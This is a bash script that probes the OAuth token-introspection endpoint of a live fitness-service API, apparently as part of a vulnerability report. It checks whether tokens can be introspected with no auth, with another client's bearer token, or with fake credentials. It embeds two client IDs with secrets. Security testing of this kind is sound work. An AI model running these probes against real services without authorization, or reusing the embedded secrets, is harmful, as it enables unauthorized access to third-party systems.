#!/data/data/com.termux/files/usr/bin/bash
# g-introspect3.sh — does introspection need a client at all?
#
# We proved client B can introspect client A's token. We never asked the prior
# question: how much authority does the endpoint actually require?
#
# A detail from an earlier run was missed at the time: introspection succeeded with
# "Authorization: Bearer <the token itself>" rather than Basic client credentials.
# So the endpoint accepts more than one auth shape, and the obvious next question is
# whether it accepts none.
#
#   no auth works            -> ANYONE holding a leaked token string can validate it
#                               and learn which app it belongs to. That is far larger
#                               than one client reading another's.
#   bearer-with-other-token  -> a token can be used to introspect a DIFFERENT token
#   only Basic works         -> the finding stays as written, now with its boundary
#                               established rather than assumed
set -u
A=$(printf '227ZG3:458dd4f32a9db4957cf15fd464be196d' | base64 -w0 2>/dev/null || printf '227ZG3:458dd4f32a9db4957cf15fd464be196d' | base64)
B=$(printf '228TQD:7659f9d9ecc92d6dc1ee0d1774e9744a' | base64 -w0 2>/dev/null || printf '228TQD:7659f9d9ecc92d6dc1ee0d1774e9744a' | base64)
I=https://api.fitbit.com/1.1/oauth2/introspect
mint() { curl -s --max-time 14 -X POST https://api.fitbit.com/oauth2/token -H "Authorization: Basic $1" \
  -H 'Content-Type: application/x-www-form-urlencoded' -d 'grant_type=client_credentials' \
  | python3 -c "import sys,json;print(json.load(sys.stdin).get('access_token',''))" 2>/dev/null; }

echo "minting one token per client..."
TA=$(mint "$A"); TB=$(mint "$B")
printf '  227ZG3: %s chars   228TQD: %s chars\n\n' "${#TA}" "${#TB}"
{ [ "${#TA}" -lt 50 ] || [ "${#TB}" -lt 50 ]; } && { echo "mint failed — nothing below would be readable"; exit 1; }

q() { printf '  %-50s ' "$1"; shift
  if [ -z "$1" ]; then
    curl -s --max-time 14 -X POST "$I" -H 'Content-Type: application/x-www-form-urlencoded' \
      --data-urlencode "token=$2" -w ' [%{http_code}]\n'
  else
    curl -s --max-time 14 -X POST "$I" -H "Authorization: $1" \
      -H 'Content-Type: application/x-www-form-urlencoded' --data-urlencode "token=$2" -w ' [%{http_code}]\n'
  fi | tr -d '\n' | head -c 320; echo; sleep 2; }

echo "######################################################################"
echo "# How much authority does introspection actually require?            #"
echo "######################################################################"
q "[BASELINE] Basic 228TQD, reads 227ZG3's token"  "Basic $B"         "$TA"
q "[NO AUTH]  no Authorization header at all"      ""                 "$TA"
q "[BEARER]   Bearer 228TQD's token -> 227ZG3's"   "Bearer $TB"       "$TA"
q "[BEARER]   Bearer the SAME token as the subject" "Bearer $TA"      "$TA"
q "[FAKE]     Basic with fabricated credentials"   "Basic $(printf 'ZZZZZZ:0000000000000000000000000000dead' | base64 -w0)" "$TA"
q "[SENTINEL] Basic 228TQD, fabricated token"      "Basic $B"         "ZZZNOTATOKEN7x2"

cat <<'TXT'

  HOW TO READ

    [NO AUTH] returns the token's details
        -> introspection is UNAUTHENTICATED. Anyone who finds a token string can
           confirm it is live and learn which application it belongs to. Stop and
           tell me - this is a substantially bigger finding than the cross-client one.

    [BEARER] with 228TQD's token reading 227ZG3's token works
        -> any valid token can be used to introspect any other token. Still much
           wider than "a client can read another client's".

    [FAKE] credentials work
        -> the Basic header is not verified at all.

    Only the BASELINE works and everything else is refused
        -> the finding stands exactly as written, and its boundary is now tested
           rather than assumed. That is worth stating in the report too.
TXT
